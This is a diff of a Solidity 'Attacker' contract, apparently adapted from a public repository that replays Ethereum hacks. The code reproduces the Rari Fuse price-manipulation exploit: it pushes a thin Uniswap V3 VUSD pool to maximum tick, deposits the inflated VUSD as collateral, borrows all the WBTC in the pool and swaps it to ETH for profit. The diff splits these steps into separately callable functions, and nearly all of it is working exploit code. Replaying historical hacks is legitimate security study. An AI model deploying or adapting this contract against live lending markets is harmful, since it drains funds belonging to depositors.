@@ -1,12 +1,17 @@
+// SPDX-License-Identifier: MIT
 pragma solidity >=0.8.0;
-import "forge-std/console.sol";
+
 import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
 import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 import "./interfaces/IERC20.sol";
 import "./interfaces/IWETH.sol";
+
 // same as Uniswap but 0.8.x compatible
 import "./interfaces/INonfungiblePositionManager.sol";
 import "./lib/UniswapMath.sol";
+
+// This contract is modified MrToph/replaying-ethereum-hacks/contracts/rari-fuse/Attacker.sol
+// https://github.com/MrToph/replaying-ethereum-hacks/blob/master/contracts/rari-fuse/Attacker.sol
 
 // this is like Compound's CToken interface
 interface IFToken is IERC20 {
@@ -59,28 +64,7 @@ contract Attacker {
         );
     }
 
-    /// first step of attacker is to manipulate the VUSD <> USDC UniswapV3 pool price
-    function manipulateUniswapV3() external payable {
-        // https://ethtx.info/mainnet/0x89d0ae4dc1743598a540c4e33917efdce24338723b0fabf34813b79cb0ecf4c5/
-        // 1. buy 250k USDC with WETH
-        buyUSDC();
-
-        // Turns out these two steps are not needed, when buying up all VUSD, it automatically ends up at MAX_TICK
-        // 2. Get a small amount of VUSD (exploiter did this through minter but we can just do a first small swap)
-        // 3. Create LP position at max tick
-
-        // 4. Perform the swap such that we burn through the range orders up to our position at max tick
-        console.log("=== Current price before swap ===");
-        printCurrentPrice();
-        buyAllVUSD();
-        console.log("=== Current price after swap ====");
-        printCurrentPrice();
-
-        // refund left-over ETH
-        refundWETH();
-    }
-
-    function buyUSDC() internal {
+    function buyUSDC() external payable {
         WETH.deposit{value: msg.value}();
 
         uint256 wantUsdc = 250_000 * 1e6;
@@ -95,10 +79,11 @@ contract Attacker {
                 amountInMaximum: type(uint256).max,
                 sqrtPriceLimitX96: 0
             });
-        uint256 amountIn = swapRouter.exactOutputSingle(params);
+
+        swapRouter.exactOutputSingle(params);
     }
 
-    function buyAllVUSD() internal {
+    function buyAllVUSD() external {
         // we won't actually be able to buy up the entire VUSD.balanceOf(pool) balance, it'll be slightly less. I assume this is due to fees still in the contract or something
         // instead we use the sqrtPriceLimit at a max tick to search and buy up all liquidity up to this tick, s.t., in the end the new price will be at max tick
         // the sqrtPriceLimitX96 used here will end up being the sqrtPrice & currentTick of slot0, so pump it up to the maximum
@@ -111,7 +96,64 @@ contract Attacker {
         );
     }
 
-    /// will be called when swapping USDC to VUSD in step 1.4
+    // must enter fVUSD market such that it is counted as collateral
+    function enterFuseMarket() external {
+        address[] memory markets = new address[](1);
+        markets[0] = address(fVUSD);
+        comptroller.enterMarkets(markets);
+    }
+
+    // we should have ~230k VUSD from previous swap manipulation
+    // assume we want to provide 4M$ as VUSD in collateral
+    // figure out the VUSD amount we need to deposit
+    function depositVusdcCollateral() external {
+        uint256 vusdCollateral = (10**VUSD.decimals() * 4_000_000 * 1e6) /
+            getUniswapTwapPrice(600);
+        require(
+            VUSD.balanceOf(address(this)) >= vusdCollateral,
+            "not enough VUSD. wait one more block until price increases"
+        );
+        VUSD.approve(address(fVUSD), vusdCollateral);
+        require(fVUSD.mint(vusdCollateral) == 0, "mint error");
+    }
+
+    // borrow WBTC
+    function borrowWbtc() external {
+        IERC20 wbtc = IERC20(fWBTC.underlying());
+        uint256 wbtcCash = wbtc.balanceOf(address(fWBTC));
+        uint256 success = fWBTC.borrow(wbtcCash);
+        require(success == 0, "borrow error");
+    }
+
+    // swap WBTC to WETH, change it to ETH for easier profit calculation
+    function swapWbtcToWeth() external {
+        IERC20 wbtc = IERC20(fWBTC.underlying());
+        uint256 wbtcAmount = wbtc.balanceOf(address(this));
+
+        wbtc.approve(address(swapRouter), type(uint256).max);
+        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
+            .ExactInputSingleParams({
+                tokenIn: address(wbtc),
+                tokenOut: address(WETH),
+                fee: 3000,
+                recipient: address(this),
+                deadline: 1e10,
+                amountIn: wbtcAmount,
+                amountOutMinimum: 0, // should change this in prod
+                sqrtPriceLimitX96: 0
+            });
+
+        swapRouter.exactInputSingle(params);
+    }
+
+    // for WETH withdraw
+    function refundWETH() external {
+        WETH.withdraw(WETH.balanceOf(address(this)));
+        (bool success, ) = msg.sender.call{value: address(this).balance}("");
+        require(success, "!refundWETH");
+    }
+
+    // will be called when swapping USDC to VUSD in step 1.4
     function uniswapV3SwapCallback(
         int256 amount0Delta,
         int256 amount1Delta,
@@ -128,56 +170,9 @@ contract Attacker {
         USDC.transfer(address(pool), uint256(amount1Delta));
     }
 
-    /// second step of the attack where we deposit price-inflated VUSD as collateral
-    /// and borrow other fuse assets
-    function fuseAttack() external payable {
-        console.log("=== Depositing VUSD as collateral and borrowing WBTC ===");
-        printUniswapTwapPrice(600);
-
-        // must enter fVUSD market such that it is counted as collateral
-        address[] memory markets = new address[](1);
-        markets[0] = address(fVUSD);
-        comptroller.enterMarkets(markets);
-
-        // we should have ~230k VUSD from previous swap manipulation
-        // assume we want to provide 4M$ as VUSD in collateral
-        // figure out the VUSD amount we need to deposit
-        uint256 vusdCollateral = (10**VUSD.decimals() * 4_000_000 * 1e6) /
-            getUniswapTwapPrice(600);
-        require(
-            VUSD.balanceOf(address(this)) >= vusdCollateral,
-            "not enough VUSD. wait one more block until price increases"
-        );
-        VUSD.approve(address(fVUSD), vusdCollateral);
-        require(fVUSD.mint(vusdCollateral) == 0, "mint error");
-
-        // borrow all WBTC, could go on and borrow other tokens in fuse pool 23
-        IERC20 wbtc = IERC20(fWBTC.underlying());
-        uint256 wbtcCash = wbtc.balanceOf(address(fWBTC));
-        uint256 success = fWBTC.borrow(wbtcCash);
-        require(success == 0, "borrow error");
-
-        // change it to ETH for easier profit calculation
-        wbtc.approve(address(swapRouter), type(uint256).max);
-        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
-            .ExactInputSingleParams({
-                tokenIn: address(wbtc),
-                tokenOut: address(WETH),
-                fee: 3000,
-                recipient: address(this),
-                deadline: 1e10,
-                amountIn: wbtcCash,
-                amountOutMinimum: 0, // should change this in prod
-                sqrtPriceLimitX96: 0
-            });
-        uint256 wethReceived = swapRouter.exactInputSingle(params);
-
-        refundWETH();
-    }
-
-    /// returns TWAP price in 6 decimals
+    // returns TWAP price in 6 decimals
     function getUniswapTwapPrice(uint32 secondsAgo)
-        internal
+        public
         view
         returns (uint256 price)
     {
@@ -199,32 +194,27 @@ contract Attacker {
         );
     }
 
-    function refundWETH() internal {
-        WETH.withdraw(WETH.balanceOf(address(this)));
-        (bool success, ) = msg.sender.call{value: address(this).balance}("");
-        require(success, "!refundWETH");
+    function getUniswapCurrentPrice() public view returns (uint256 price) {
+        (price, ) = getSlot0PriceAndTick();
     }
 
-    /// for WETH withdraw
-    receive() external payable {}
+    function getUniswapCurrentTick() public view returns (int24 tick) {
+        (, tick) = getSlot0PriceAndTick();
+    }
 
-    function printUniswapTwapPrice(uint32 secondsAgo)
+    function getSlot0PriceAndTick()
         public
         view
-        returns (uint256 price)
+        returns (uint256 price, int24 tick)
     {
-        price = getUniswapTwapPrice(secondsAgo);
-        console.log("gmTWAP-Price:", price);
-    }
-
-    function printCurrentPrice() public view returns (uint256 price) {
-        (uint160 sqrtRatioX96, int24 tick, , , , , ) = pool.slot0();
+        (uint160 sqrtRatioX96, int24 slot0Tick, , , , , ) = pool.slot0();
         price = UniswapMath.mulDiv(
             sqrtRatioX96,
             sqrtRatioX96,
             uint256(2**192) / 1e18
         );
-        console.log("slot0: Price: %s\nTick:", price);
-        console.logInt(tick);
+        tick = slot0Tick;
     }
+
+    receive() external payable {}
 }
